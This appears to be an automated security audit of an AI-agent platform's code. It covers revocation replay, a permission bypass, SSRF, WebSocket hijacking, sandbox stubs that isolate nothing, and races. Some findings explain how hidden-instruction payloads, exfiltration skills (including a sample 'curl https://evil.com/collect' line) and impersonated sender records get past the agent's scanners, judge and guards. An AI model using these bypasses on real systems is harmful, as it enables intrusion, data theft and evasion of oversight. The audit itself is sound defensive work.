- `SignedCrl` carries `generated_at` and `ttl_seconds` (crl.rs:23-25) and they ARE included in the signed canonical payload (crl.rs:65-70), so freshness fields are authenticated — yet the consumer never reads them for freshness. There is no persisted CRL state anywhere (the only storage import is for license.json, not a CRL high-water mark).

Failure construction is exact: the issuer genuinely signs CRL_t0 (revoked=[]) at time t0, later signs CRL_t1 (revoked=[sub_X]). An attacker on the network path / stale CDN cache / DNS-hijacked api.duduclaw.tw replays the genuine CRL_t0. At line 532 `verify()` returns Ok (real issuer signature over CRL_t0). At line 538 `is_revoked(sub_X)` returns false. The else branch (line 541-542) merely logs debug and returns Ok — the client never downgrades, silently re-granting the revoked tier. Because nothing records that CRL_t1 (with a newer `generated_at`) was ever seen, an old genuinely-signed CRL is indistinguishable from the current one. Signature verification alone provides authenticity but not freshness — exactly the replay/rollback gap described. Severity HIGH (security, revocation-bypass) is justified.

summary: odoo_execute classifies every call as the 'execute' verb, so an agent allowed only 'execute' can perform writes/creates/unlinks via method='write'/'create', bypassing the per-model write/create restrictions in allowed_actions.
failure_scenario: agent.toml [odoo] allowed_actions = ["read","search","execute"] (no write). Agent calls odoo_execute{model:"crm.lead", method:"write"} or method:"action_archive". classify_odoo_call returns ("execute","crm.lead"); check_action_permission passes because 'execute' is allowed; the write goes through. The intended write-gate (allowed_actions without 'write') is silently defeated. odoo_execute also accepts arbitrary methods except a tiny blocklist (unlink/init/...), so create/write/action_* all slip through as 'execute'.
verify_reasoning:
CONFIRMED. The full attack chain is provable from the source.

1) classify_odoo_call (crates/duduclaw-cli/src/mcp.rs:5290-5293): for tool "odoo_execute" it returns Some(("execute", model)) — the verb is the hardcoded literal "execute", derived ONLY from the tool name, never from params["method"]. So odoo_execute{model:"crm.lead", method:"write"} classifies as ("execute","crm.lead").

2) check_action_permission (crates/duduclaw-cli/src/odoo_pool.rs:259-279) forwards that verb to cfg.permits(verb, model). With allowed_actions=["read","search","execute"], permits (crates/duduclaw-odoo/src/agent_config.rs:106-120) matches the bare "execute" token (verb_of=="execute"==action, model_of==None → all models) and returns true. The write-gate (no "write" in allowed_actions) is never consulted because the verb was already collapsed to "execute".

3) The handler-level guard is insufficient. odoo_execute handler (mcp.rs:5212-5233) only blocks BLOCKED_METHODS = ["unlink","uninstall","uninstall_hook","init","_auto_init","_register_hook","signal_workflow","execute_import"] (lines 5220-5227). This list does NOT contain "write", "create", or any "action_*" method. is_model_blocked (connector.rs:211) checks only the model. execute_kw (connector.rs:124-144 → rpc.rs) passes method straight through with no method-level permission check.

Therefore an agent with allowed_actions=["read","search","execute"] (no "write"/"create") can call odoo_execute{model:"crm.lead", method:"write", ids:"[1]"} or method:"action_archive" and the mutation reaches Odoo, silently defeating the intended per-model write/create restriction. By contrast, the dedicated tools odoo_crm_update_stage→("write",...) and odoo_crm_create_lead→("create",...) ARE correctly classified (mcp.rs:5278-5279), so odoo_execute is the bypass: arbitrary write/create/action_* slip through as the "execute" verb. The qualified-verb form (e.g. "write:crm.lead") in allowed_actions is also moot here since the request never presents the "write" verb to permits().

summary: The Odoo reqwest::Client is built without a redirect policy, so it follows up to 10 redirects by default — the SSRF URL validator (is_safe_odoo_url) only checks the initial URL string and is bypassable via a 30x redirect to a private/metadata host.
failure_scenario: Operator (or a compromised/typo'd config) points Odoo url at https://attacker.example.com which passes is_safe_odoo_url. The attacker server responds 302 to http://169.254.169.254/latest/meta-data/ or http://10.0.0.5/. reqwest follows the redirect (no Policy::none()), issuing the authenticated POST against the internal target. Combined with DNS rebinding (host validation never re-checks the resolved IP), the validator provides no real SSRF protection at request time. Set .redirect(reqwest::redirect::Policy::none()) and/or validate the resolved socket addr.
verify_reasoning:
The reqwest client driving all Odoo RPC is built at crates/duduclaw-odoo/src/connector.rs:78-81 with only `.timeout(Duration::from_secs(30))` and no `.redirect(...)` call. reqwest's default is `Policy::default()` = follow up to 10 redirects, so this client follows 30x redirects. That same `http` client is passed into rpc.rs (`http: &reqwest::Client` at rpc.rs:32/79/108) which issues the authenticated `.post(format!("{url}/jsonrpc")).send()` (rpc.rs:52-54).

The SSRF guard `is_safe_odoo_url` (crates/duduclaw-gateway/src/handlers.rs:5652) only inspects the initial URL *string*: it string-prefix-matches localhost HTTP, and for `https://` it slices the host out of the literal URL and runs `is_private_host`/`is_private_ip` (handlers.rs:5666-5719). It is invoked only at config/save time (handlers.rs:5729, 5970) against the operator-supplied string. It never re-validates the host of a redirect target nor the resolved socket address. So an https://attacker.example.com URL passes the validator, and an attacker (or typo'd/compromised config) server returning 302 to http://169.254.169.254/ or http://10.0.0.5/ causes reqwest to follow the redirect and re-issue the request against the internal target. DNS rebinding similarly defeats the string check since the resolved IP is never re-validated.

That this is a real, fixable gap (not an environment default) is corroborated by sibling code that DOES defend the same way: crates/duduclaw-gateway/src/web_fetch.rs:402/441 and updater.rs:232/357 both set `reqwest::redirect::Policy::custom(...)`. The Odoo connector omits it. Note the validator does block bare http:// to non-localhost hosts, but a redirect can still chain from a permitted https:// host to an http:// internal target because the redirect target is never run through the validator. CONFIRMED; remediation: add `.redirect(reqwest::redirect::Policy::none())` (or a custom policy re-checking each hop) at connector.rs:78 and/or validate the resolved socket addr.

summary: resolve_by_channel returns the first read_dir match for a channel handle with no duplicate detection, despite the module doc claiming duplicated handles are skipped — enabling identity impersonation.
failure_scenario: Two files under identity/people/ both declare `discord: "1234567890"` (e.g. an attacker-controlled agent writes identity/people/evil.md via shared_wiki_write — the identity/ namespace is agent_writable by default unless an operator manually adds a read_only .scope.toml — claiming a privileged person's Discord ID). iter_people() relies on std::fs::read_dir, whose ordering is OS/filesystem-dependent and non-deterministic, so resolve_by_channel may return the attacker's record. That record's roles/project_ids flow into the <sender> block (channel_reply.rs build_sender_block) that SOUL.md 'reject non-project members' rules trust, granting the impersonator the victim's roles/project membership. The doc at lib/wiki_cache.rs lines 24-26 promises dedup that the code never performs.
verify_reasoning:
CONFIRMED. The finding is accurate on every load-bearing point; only the file path in the writeup is slightly off (it's providers/wiki_cache.rs, not lib/wiki_cache.rs — the doc lines 24-26 cited are correct).

1. No dedup despite doc promise. The module doc at providers/wiki_cache.rs:24-26 states "Files missing required fields, malformed YAML, or duplicated handles are silently skipped". But iter_people() (lines 75-101) performs ZERO duplicate detection — line 92-98 simply `out.push(person)` for every file that parses. resolve_by_channel (lines 106-126) iterates and returns on the FIRST match (line 122 `return Ok(Some(person))`). A repo-wide grep for dedup/duplicate logic in the identity crate found none. The promised dedup is never implemented.

2. Non-deterministic ordering. iter_people relies on std::fs::read_dir(&dir) (line 77) and `entries.flatten()` (line 87) with no sort. read_dir ordering is OS/filesystem-dependent, so when two files declare the same `discord: "X"` handle, which ResolvedPerson wins is non-deterministic.

3. Reachable attacker write. wiki_scope.rs:167-171 `mode_for` returns NamespaceMode::AgentWritable for any namespace without an explicit `.scope.toml` entry; wiki_scope.rs:151 treats an absent/malformed file as "no policy — all namespaces writable"; check_write returns Ok(()) for AgentWritable (line 187). So identity/people/ is writable by any agent via shared_wiki_write unless an operator manually configures read_only — exactly as claimed.

4. Privileged data flows into trusted prompt. channel_reply.rs:687 calls build_sender_block; that function (lines 5012-5066) uses the PRODUCTION path WikiCacheIdentityProvider::for_home (line 5027), calls resolve_by_channel (line 5028), and injects the resolved person's roles (lines 5038-5043) and project_ids (lines 5044-5049) into the `<sender>` XML block, explicitly described (lines 5030-5033) as "ground-truth context the user cannot override." This is the membership/role context SOUL.md 'reject non-project members' rules trust.

End-to-end: attacker writes identity/people/evil.md with a victim's discord handle → on read_dir ordering the evil record can be returned first → its roles/project_ids are injected as trusted `<sender>` context → impersonation / role escalation. The only guards present (empty external_id check line 111, malformed-YAML/missing-field skips) do NOT address duplicate handles. Finding is correct.

summary: AppleContainerRuntime::create/start are no-op stubs that ignore ContainerConfig entirely, so on macOS 15+ the preferred runtime provides zero isolation.
failure_scenario: RuntimeBackend::detect() (lib.rs:30) prefers AppleContainerRuntime when the `container` CLI exists. Its create() (apple.rs:74) discards `_config` and just returns a UUID without launching anything; start() is a no-op. The PTC sandbox then 'succeeds', runs no container at all (logs() returns empty), and the caller believes the script executed in a network-isolated read-only sandbox when nothing ran in isolation — the network=none/ro-rootfs/tmpfs guarantees advertised at sandbox.rs:344-358 are entirely unenforced on macOS.
verify_reasoning:
CONFIRMED. The finding's file/line citations are precise and the failure path is fully constructible from the code.

Dispatch chain:
- crates/duduclaw-cli/src/ptc/sandbox.rs:303 calls `duduclaw_container::RuntimeBackend::detect()`.
- lib.rs:30-32: on macOS, `if apple::AppleContainerRuntime::is_available()` returns `RuntimeBackend::Apple(...)` first — Apple is preferred when the `container` CLI exists (apple.rs:26-34 probes `container --version`).
- ptc/sandbox.rs:348-363 builds the isolation contract: `readonly_project: true`, `network_access: false` (commented `// --network=none`), readonly `additional_mounts` — these are the guarantees advertised at the cited lines 344-358.
- ptc/sandbox.rs:368 `runtime.create(container_config)` → lib.rs:49 `RuntimeBackend::Apple(rt) => rt.create(config)` → apple.rs:74 `async fn create(&self, _config: ContainerConfig)`: the parameter is `_config` (discarded), the body only does `let id = format!("duduclaw-apple-{}", uuid::Uuid::new_v4()); info!(...); Ok(ContainerId(id))`. No `container run`, no mount/network/rootfs flags applied. Returns Ok, so the line-370 fallback-to-subprocess is NOT taken.
- ptc/sandbox.rs:385 `runtime.start(&container_id)` → apple.rs:82-85 is a literal no-op (`info!(...); Ok(())`). Returns Ok, so the line-386 fallback is NOT taken.
- ptc/sandbox.rs:394 `runtime.logs(&container_id)` → apple.rs:99-101 runs `container logs <uuid>` against a container that was never created; this returns Err (run_cmd non-zero exit, apple.rs:58-64), caught at line 398 as `(format!("Container error: {e}"), 1)`.

Net effect: create()/start() report success while nothing was ever launched in isolation; the network=none / readonly-rootfs / readonly-mount guarantees in ContainerConfig never reach any runtime. On macOS 15+ the preferred backend provides zero isolation. Two immaterial inaccuracies in the finding: (a) `logs()` returns an error string with exit_code=1, not empty output; (b) because no container runs and create/start succeed (no subprocess fallback), the script effectively does not execute at all in this branch rather than running un-isolated. Neither weakens the security conclusion — the advertised sandbox is entirely unenforced. Severity HIGH for security is justified given the platform's container-sandbox isolation promise (CLAUDE.md: `--network=none`, read-only rootfs, tmpfs).

summary: write_to_queue appends up to 1 MiB JSON lines to bus_queue.jsonl with no advisory lock; concurrent writers can interleave and corrupt lines that are then silently lost.
failure_scenario: Multiple Python channel processes (Telegram/LINE/Discord) plus the Rust gateway all append to ~/.duduclaw/bus_queue.jsonl. POSIX O_APPEND is only atomic below PIPE_BUF (~4 KiB); MAX_PAYLOAD_SIZE is 1 MiB (lib.rs:21), so two simultaneous large send_to_bus/send_message writes can interleave, producing a malformed JSONL line. The gateway dispatcher (dispatcher.rs:463) fails to parse it as agent_message, falls into the `_` arm, and keeps the corrupt fragment as a 'remaining line' forever — the original message is dropped and never delivered while the queue accumulates garbage.
verify_reasoning:
CONFIRMED. The code matches the finding precisely.

(1) No lock: write_to_queue (lib.rs:45-50) opens with OpenOptions::new().create(true).append(true) and writes via writeln!. grep for flock/fcntl/lockf/FileLock across the bridge crate and python/ returns no advisory locking anywhere; the Python wrapper base.py:22 calls _native.send_to_bus with no lock either.

(2) Lines can exceed PIPE_BUF: MAX_PAYLOAD_SIZE = 1_048_576 (lib.rs:21); the sole size guard (lib.rs:38) rejects only >1 MiB, so a line up to ~1 MiB is permitted. POSIX O_APPEND atomicity is guaranteed only below PIPE_BUF (512 bytes minimum, 4096 on Linux), so a single ~1 MiB writeln! is not an atomic kernel write and two concurrent large writes can interleave into a malformed JSONL line.

(3) Multiple concurrent OS-level writers genuinely exist: Python channel plugins via base.py:22 (send_to_bus) and agent_tools.py:184 (send_message), plus the Rust gateway's own append_line (dispatcher.rs:451). These are separate processes, so even an in-process mutex would not prevent interleaving.

(4) Corrupt line silently retained forever, original lost: dispatcher.rs:407 does serde_json::from_str::<BusMessage>(line); a corrupted/interleaved fragment fails to parse, falls into the `_` arm (dispatcher.rs:463), and is pushed to remaining_lines (dispatcher.rs:465). remaining_lines is then written back to the queue via temp+rename (dispatcher.rs:485-498). Since the fragment never parses as type=="agent_message", it is re-kept on every 5s poll cycle indefinitely, while the original message payload it corrupted is never delivered. This exactly reproduces the claimed failure.

Severity HIGH (correctness) is justified: silent message loss plus unbounded garbage accumulation in a multi-process append path with no synchronization.

summary: memory_store HTML-escapes natural-language content before persisting, permanently corrupting any stored text containing < > & " '.
failure_scenario: Client stores content="if x < 3 && y > 1 then call it 'done'". validate_memory_store_params runs _sanitize() (html.escape) so the backend persists "if x < 3 && y > 1 then call it 'done'". memory_read (read.py:138 returns record['content'] verbatim) hands the mangled, double-encoded string back to the agent; the original text is unrecoverable. memory is plain text, not HTML, so escaping is the wrong defense here and silently destroys data.
verify_reasoning: The data path corrupts plain-text content via HTML escaping with no reverse step. validation.py:66 `_sanitize` = `html.escape(text, quote=True)`; validation.py:190 returns `"content": _sanitize(content)` from `validate_memory_store_params`. store.py:112 invokes that validator, namespace.py:52 `inject` spreads params unchanged (content stays escaped), store.py:122-124 passes `scoped["content"]` to the backend write. On the way out, read.py:137 returns `record.get("content")` verbatim with no `html.unescape`. A grep-level review of the whole memory tool dir (validation/store/read/namespace) shows no unescape anywhere. Therefore content `if x < 3 && y > 1 then call it 'done'` is persisted as `if x < 3 && y > 1 then call it 'done'` and read back mangled. Memory is plain NL text fed to an LLM, not HTML, so escape-at-storage is the wrong layer and is lossy (a literal `<` typed by the user becomes `&lt;`, i.e. double-encoding is genuinely ambiguous on recovery). The finding's cited lines are accurate. Minor caveat keeping this from absolute certainty: end-to-end visibility depends on the injected backend store_fn/read_fn not unescaping, which is out of this file — but nothing in the repo's memory path unescapes and read explicitly returns content verbatim, so the corruption is reachable as described.

summary: /ws/chat upgrade performs no Origin validation, so it is vulnerable to cross-site WebSocket hijacking (CSWSH) even on loopback binds.
failure_scenario: The main /ws handler (server.rs:1388-1399) rejects connections whose Origin is not localhost/127.0.0.1, preventing a malicious page from opening the socket from the victim's browser. ws_chat_handler has no equivalent check. A user who is browsing any attacker-controlled web page while the gateway runs locally will have that page silently open ws://localhost:18789/ws/chat from their browser (no Origin enforcement, no token needed) and drive the user's own agent — issuing prompts, reading streamed agent replies, and invoking tools — a classic CSRF-over-WebSocket against the agent.
verify_reasoning:
The asymmetry the finding describes is real and exploitable as written.

1. Route registration: server.rs:974 maps `/ws/chat` directly to `crate::webchat::ws_chat_handler`, merged into the app at line 996. No CORS/Origin tower layer wraps the merged router — `grep` for `layer/CorsLayer/origin` over server.rs shows the only Origin handling is the inline check inside `ws_handler` (lines 1388-1399), and the only `.layer()` calls are a DefaultBodyLimit on the federation route (1020). So no middleware compensates.

2. webchat.rs `ws_chat_handler` (lines 102-108) takes only `ws: WebSocketUpgrade`, `ConnectInfo(peer)`, and `State` — it never extracts a `HeaderMap` and never inspects the `Origin` header. It calls `ws.on_upgrade(...)` unconditionally. By contrast `ws_handler` in server.rs:1376-1402 explicitly takes `headers: HeaderMap` and rejects non-localhost origins with 403 (1388-1399). The CSWSH guard exists for `/ws` and is absent for `/ws/chat` — exactly the claimed gap.

3. No post-upgrade auth makes up for it. `handle_chat_socket` (webchat.rs:117-) only acquires a global semaphore permit (118-124) and a per-IP connection count (133-136), then immediately enters the message loop. On the first `UserMessage` (line 210) it runs chat commands and `channel_reply::build_reply_with_session(&content, ...)` (line 231) — driving the real agent — with no token, no JWT, no connect handshake. The main `/ws` requires a `connect` frame with JWT/legacy-token/Ed25519 (server.rs:1416-1428+); `/ws/chat` requires nothing.

Therefore a malicious page loaded in the victim's browser while the gateway runs on loopback can open ws://localhost:<port>/ws/chat from the victim's browser context (browser sends an attacker Origin, which is never checked), send a UserMessage, and both drive the user's agent and read the streamed `AssistantDone` reply back. The per-IP/global connection limits (3/IP, 10 global) do not stop a single attacker socket. Classic CSWSH/CSRF-over-WebSocket against the agent. HIGH severity is appropriate.

summary: Ed25519 challenge is stored in a single shared Mutex<Option<..>>, so concurrent challenge-response handshakes clobber each other's challenge.
failure_scenario: Two clients authenticate via Ed25519 concurrently. Client A calls issue_challenge() (stores challenge_A); before A responds, Client B calls issue_challenge() which overwrites the slot with challenge_B. When A sends its signature, verify_ed25519() .take()s challenge_B and verifies A's signature against B's challenge -> A fails legitimately (intermittent auth failures / DoS for honest clients). Because the slot is global rather than per-connection, the challenge nonce is not actually bound to the connection that requested it. Fix: issue and verify a per-connection challenge instead of a shared one.

summary: Login rate limiter is keyed solely by email and increments on every attempt, allowing an attacker to lock out any known account for 15 minutes.
failure_scenario: An attacker sends 5 POST /api/login requests for victim@example.com (wrong passwords). check_login_rate_limit increments the per-email counter to 6 within the 900s window; from then on handle_login returns 429 'too many login attempts' even for the victim's correct password until the window expires. Because the key is the email (not IP) and is never reset on a successful login, an attacker who knows the email can deny the legitimate user access indefinitely by re-poking every 15 minutes. Consider IP-scoped limiting plus resetting the counter on successful auth.

summary: GET /api/reliability/summary is unauthenticated and runs idx.sync_from_files().await on every request, exposing per-agent audit metrics and enabling cheap I/O amplification.
failure_scenario: Any network client that can reach the gateway port issues curl 'http://host:port/api/reliability/summary?agent_id=<any-agent>' with no Authorization header (the route is in the main `app` with_state, not auth_router, and the handler does no role check). It returns consistency_score / task_success_rate / fallback_trigger_rate for any agent name, leaking operational reliability data, and forces a full AuditEventIndex::open + sync_from_files file scan per call with no rate limit, so a loop drives sustained disk I/O. The doc-comment claims this is acceptable because it is 'read-only', but it still leaks per-agent data and is a DoS lever.

summary: get_allowed_channels (used by is_channel_allowed) has no global-scope fallback, unlike get_bool/get_with_fallback, so a whitelist configured at 'global' scope is silently ignored and all channels are allowed.
failure_scenario: An operator sets allowed_channels at scope_id='global' expecting it to restrict every guild/chat (the same mental model as mention_only, which DOES fall back to global via get_with_fallback). is_channel_allowed -> get_allowed_channels reads only the exact (channel_type, scope_id) row; for a specific guild it returns empty -> is_channel_allowed returns true (allow-all). The intended channel restriction is bypassed in every guild/chat where no per-scope whitelist row exists.

summary: LINE replies are placed verbatim into a single Flex bubble text component with no length splitting, so long AI replies exceed LINE's message/component size limits and fail to deliver.
failure_scenario: build_reply_with_session returns a long reply (e.g. several thousand chars). to_line_flex_message (channel_format.rs:115) puts the entire `text` into one Flex text node with no use of split_text or limits::LINE_MESSAGE. LINE rejects oversized Flex messages; send_reply_rich fails, the push fallback (line 376) builds the identical oversized payload and also fails, so the user gets no reply. Unlike Telegram/Discord, LINE has no chunking path at all.

summary: Feishu webhook accepts unsigned/unauthenticated events when verification_token is unset, and even when set only checks a static shared token (no request signature), allowing forged inbound messages.
failure_scenario: start_feishu_webhook() reads feishu_verification_token via unwrap_or_default(); handle_webhook() only runs the constant_time_eq check inside `if !state.verification_token.is_empty()`. If the operator does not configure the token (common, since Feishu also offers Encrypt Key/signature headers that are never checked here), any actor that can reach POST /webhook/feishu can submit an im.message.receive_v1 event with arbitrary text and chat_id, which handle_message() forwards to the agent and replies to via the bot's tenant token — unauthenticated command execution and message spoofing into arbitrary Feishu chats the bot can post to.

summary: strip_feishu_mentions slices at a byte offset that can land inside a multi-byte whitespace char, panicking the webhook handler on crafted input.
failure_scenario: result[start..].find(char::is_whitespace) returns the byte offset of the first Unicode-whitespace char after an `@_user_` placeholder; the code then slices &result[start + end + 1..]. char::is_whitespace matches multi-byte whitespace such as U+3000 (ideographic space, 3 bytes). If a message renders as e.g. `@_user_1\u{3000}rest`, start+end+1 falls in the middle of the 3-byte char and the slice panics with `byte index is not a char boundary`. Reachable from any user whose @mention is followed by a CJK full-width space; the panic aborts handle_message for that event (500 / dropped message). The analogous Slack strip_bot_mention is safe because it indexes off the single-byte '>' delimiter.

summary: to_asr_pcm indexes pair[0] without checking the chunk has at least one element when samples length is processed by chunks(2), and more importantly assumes non-empty pairs; an odd/empty trailing chunk path relies on pair[0] which can panic on an empty slice.
failure_scenario: self.samples.chunks(2) never yields an empty chunk for non-empty input, but pair[0] is an unchecked index; if append_samples ever stores an odd count and a future refactor feeds a zero-length chunk (e.g. via chunks(n) with n from config), pair[0] panics. More concretely today: duration_seconds()/to_asr_pcm assume stereo (96000 samples/s) but Songbird decoded_voice frames are pushed verbatim via append_samples without validating they are stereo-interleaved; a mono decode path would make the 3:1 decimation and stereo-average produce wrong-rate PCM fed to Whisper, yielding silent/garbled transcripts with no error surfaced. Voice is feature-gated and lower-traffic, hence MEDIUM.

summary: poll_pending_taskspecs claims to 'immediately mark Running to prevent double-pickup' but the status flip happens inside the fire-and-forget spawned task, leaving a window for double dispatch.
failure_scenario: poll_pending_taskspecs runs every 2 ticks (~10s). On tick N it loads a TaskSpec with status==Planned and tokio::spawn(dispatch_taskspec(...)) (fire-and-forget). The Planned->Running save only occurs inside dispatch_taskspec (line 1123). If that spawned task is delayed in scheduling or the save is slow, tick N+1 (~10s later) re-loads the still-Planned spec from disk and spawns a SECOND dispatch_taskspec for the same task. Both executions then run the same steps concurrently against the same agent_dir tasks/{id}.json with last-writer-wins saves, duplicating side effects (CLI spawns, replans). The module doc-comment at line 1035 explicitly but incorrectly asserts this cannot happen.

summary: verify_step_auto reports a criterion as PASSED whenever the step output echoes any >3-char keyword from the criterion description, so an agent that merely restates the goal without doing the work passes verification.
failure_scenario: A step has acceptance_criteria 'Endpoint returns 200 on valid token' with method Auto. The agent fails the task but its response text says 'I attempted to make the endpoint return 200 but could not'. verify_step_auto lowercases both sides and counts keyword hits (endpoint, returns, valid, token) > 0, so passed=true. dispatch_taskspec (line 1186) marks the step Passed, the task progresses to dependent steps, and the failure is silently swallowed — the whole TaskSpec can report Completed while no real work succeeded.

summary: atomic_merge advances target_branch's ref via a real merge commit, then restore_head checks out the pre-merge HEAD; if the repo was originally in detached-HEAD state, the merge commit becomes unreachable.
failure_scenario: repo_root is in detached HEAD (current_branch_name returns None, original_head = some commit C). atomic_merge does 'git checkout target_branch', merges worktree_branch creating commit M on target_branch, then restore_head sees branch==None and runs 'git checkout C' (the old commit). target_branch ref now points at M, which is fine — but the agent's expectation that work landed on the checked-out tree is broken, and any concurrent non-worktree dispatch using repo_root as its working dir (effective_work_dir == agent_dir == repo_root) has its files swapped mid-run by the checkout sequence since only merges, not checkouts, are serialized by global_merge_lock.

summary: u32 overflow in mask region computation can panic (debug) or wrap and silently skip masking (release).
failure_scenario: mask_screenshot_regions computes `x_end = (x + w).min(img_w)` where x and w are u32 sourced from detect_sensitive_regions JSON (Math.round of getBoundingClientRect, or model/attacker-influenced DOM). If x + w overflows u32 (e.g. x=4_000_000_000, w=1_000_000_000) the addition panics in debug builds (DoS of the orchestrator task) and in release wraps to a small value, making x_end < x so the inner `for px in x..x_end` loop is empty — the region meant to hide a password is NOT painted, silently leaking it. Use saturating_add / checked_add and clamp before the loop.

summary: targets_sensitive_input is hardcoded false, making the High-risk sensitive-input branch of assess_risk unreachable for the container path.
failure_scenario: In run_loop the ActionContext is built with `targets_sensitive_input: false` and the comment claims it is 'detected from DOM in capture', but nothing ever sets it true. assess_risk (risk_detector.rs:44) returns RiskLevel::High only when targets_sensitive_input is true OR the Type text itself matches the credit-card/CVV heuristic. So a left_click that focuses a password field, or a Type of a non-numeric password, is classified Low risk and executed without channel confirmation even though the whole sensitive-input detection machinery exists. The DOM region data already gathered by capture_masked_screenshot is never propagated into the risk context.

summary: Cache-hit-vs-spawn metric is racy under concurrent acquires, producing inverted spawn/hit accounting.
failure_scenario: acquire_and_invoke_for_account_with_model samples global session_count() before and after acquire and infers 'spawn' iff count grew. session_count() is process-global across all agents. If two channel replies for different agents acquire concurrently, agent A's acquire can observe the count bump caused by agent B's spawn and record a false pty_pool_acquire_spawn for what was actually a cache hit (or vice-versa: a real spawn paired with another session's eviction shows count unchanged and is logged as a cache hit). The metric is only diagnostic, but operators tuning pool sizing off pty_pool_acquire_spawn/cache_hit get misleading data under any real concurrency.

summary: Per-account PtyPool key does not isolate OAuth credentials; sessions silently use ambient ~/.claude auth, so multi-account rotation/billing is unenforced in PTY mode.
failure_scenario: acquire_for_account_with_model keys the pool cache per account_id, but spawn_session_for_key explicitly drops account_id (`_account_id_for_future_env_injection`) and injects no CLAUDE_CODE_OAUTH_TOKEN / CLAUDE_CONFIG_DIR. The managed-worker path passes account_id in InvokeParams but the worker spawn factory has the same gap. So an agent configured to use a rate-limited or budget-exhausted account A will, in PTY pool mode, actually run under whatever ambient OAuth session lives in ~/.claude — bypassing the AccountRotator's cooldown/budget enforcement and attributing cost to the wrong account. Only mitigated by the deferred-TODO note; operators relying on multi-OAuth rotation get silently wrong behaviour.

summary: Feedback-regression rollback is gated on `pre.positive_feedback_ratio > 0.0`, but compute_post_metrics defaults positive_feedback_ratio to 0.0 whenever feedback.jsonl is missing/empty — so feedback-based rollback is silently disabled for the common no-feedback-file case.
failure_scenario: judge_outcome_at line 697 only triggers a feedback rollback when `feedback_delta < -0.03 && pre.positive_feedback_ratio > 0.0`. count_positive_feedback_ratio (observation_finalizer.rs:294-337) returns Ok(0.0) when feedback.jsonl does not exist, so pre_metrics captured at apply time is also 0.0 for any agent without feedback events (the default in the codebase). A SOUL.md change that actively harms user satisfaction will never be rolled back on the feedback dimension; only prediction-error and contract-violation regressions are caught. Operators relying on the 'auto-rollback on degradation' guarantee get silent confirmation of bad versions.

summary: L3 judge prompt is built from proposal.content (the narrative), so when a structured soul_patch is present the LLM judge evaluates text that is NOT what gets written, weakening L3 to a rubber-stamp for patch-based proposals.
failure_scenario: In run_with_context_and_retry, build_judge_prompt (loop_.rs:337) embeds only proposal.content/rationale. When the Generator emitted a soul_patch, apply_patch_to_soul writes patch.content, which the judge never saw. A proposal whose narrative reads 'tighten wording in section X' but whose patch.content actually rewrites the section with subtly different behavior passes L3 with high confidence because the judge graded the (innocuous) narrative. The 4-layer verification's only LLM-semantic check is decoupled from the applied artifact.

summary: SOUL.md scanner findings below severity 70 are logged but allowed, so a patch with multiple sub-threshold hidden-content findings (and any narrative-only Soul-Evil payload) is written without blocking.
failure_scenario: In updater.apply (lines 407-428) soul_scanner.scan_soul runs on proposal.content; if max finding severity is < 70 (e.g. several severity-60 HTML-comment / zero-width findings) the code only emits an info! log and proceeds. An attacker can split a hidden-instruction payload into multiple individually-low-severity fragments (each <70) and still get them appended to SOUL.md via the legacy free-form path. Combined with the patch-path gap above, the scanner provides little real protection.

summary: Data-exfiltration scan only inspects line-by-line and treats bare HTTP(S) URLs as mere Warning, and exempts any line containing markdown-link syntax, so exfil URLs are easily smuggled past the gate.
failure_scenario: is_in_markdown_link (line 349) returns true for ANY line containing `](http`, so a line like `curl https://evil.com/collect ([ref](https://ok.com))` is treated as a markdown link and the bare-URL check is fully skipped. Even without that trick, a bare exfil URL is only FindingSeverity::Warning -> RiskLevel::Low -> passes. Combined with the Error-not-blocked gap, a skill can direct the agent to POST conversation data / secrets to an attacker endpoint and still pass the security scan that the pipeline relies on.

summary: Trial evaluation gates on conversations_used < MIN_EVALUATION_CONVERSATIONS before checking discard, so a clearly-harmful skill cannot be discarded early and keeps degrading conversations until 5 are consumed.
failure_scenario: evaluate_trial first branch (line 147) returns ExtendTrial whenever conversations_used < 5, regardless of lift. A skill producing strongly negative lift (e.g. -0.5) in its first 1-4 conversations is never matched by the `lift < DISCARD_LIFT_THRESHOLD` arm (line 178) because the early-data guard short-circuits, so a skill that is actively making the agent worse stays Active and continues to be injected for several more conversations before it can be discarded. The MIN_EVALUATION guard should still allow early discard on clearly negative lift.

summary: evaluate_and_adjust uses lifetime-cumulative total_triggers for crit_proportion, so once Critical exceeds 20% of all-time triggers it ratchets significant_upper down on every subsequent evaluation until it pins at the 0.4 floor.
failure_scenario: crit_proportion (line 556-564) is computed from layer_stats[*].total_triggers, which are monotonic lifetime counters (record_trigger only increments; rehydrate_from_db only raises them). Unlike improvement_rate (which uses a rolling 50-window), this ratio barely moves once a large history accumulates. If an agent had an early burst of Critical errors pushing the lifetime ratio above 0.2, then on EVERY future evaluate_and_adjust call the crit_proportion > 0.2 branch fires and subtracts 0.05 from significant_upper, repeatedly, until it clamps to 0.4. The shrunk Critical band then mislabels ordinary Significant errors as Critical, triggering needless emergency GVU loops (LLM cost) indefinitely, with no path to recover because total_triggers never decays.

summary: The anti-sycophancy guard in route() is dead code: the ConsistencyTracker it consults is never populated, so is_sycophantic() always returns false.
failure_scenario: route() branches on consistency.is_sycophantic(0.4) to force a TriggerReflection when capitulation rate is high. is_sycophantic() requires capitulation_window.len() >= 10. A workspace-wide grep finds zero calls to ConsistencyTracker::record(...); pe.consistency is only ever cloned (channel_reply.rs:2158) and read, never fed events. The window stays empty, capitulation_rate() returns 0.0, and the entire sycophancy-detection safety feature (its stated purpose per the module doc and EvolutionEventType::SycophancyAlert) never fires for any conversation. An agent drifting into sycophantic capitulation will never be flagged or reflected on.

summary: RL trajectories built from channel (role, content) pairs always have tool_calls=None, so ToolEfficiencyReward is always 0 and outcome_reward is hard-coded 1.0, making every exported training reward an almost-constant ~0.7.
failure_scenario: build_trajectory() hard-codes RLTurn.tool_calls = None for every turn (line 47). Consequently total_tool_calls() returns 0 for all collected trajectories, so ToolEfficiencyReward.compute() returns 0.0 (reward.rs:40-44). The collector (collector.rs:1645 path) always passes outcome_reward = 1.0. The default CompositeReward (outcome 0.7 + efficiency 0.2 + overlong 0.1) therefore evaluates to 0.7*1.0 + 0.2*0 + 0.1*overlong, i.e. ~0.7 for every short conversation, with only a tiny negative overlong term for >32k-token sessions. The rl_trajectories.jsonl dataset has near-zero reward variance and no tool-success signal, providing essentially no learnable signal for RL fine-tuning despite writing two copies per reply (global JSONL + per-agent file).

summary: Every audit query / reliability RPC opens a fresh SQLite connection and re-runs full sync_from_files, re-reading and re-parsing every JSONL file on disk on each request.
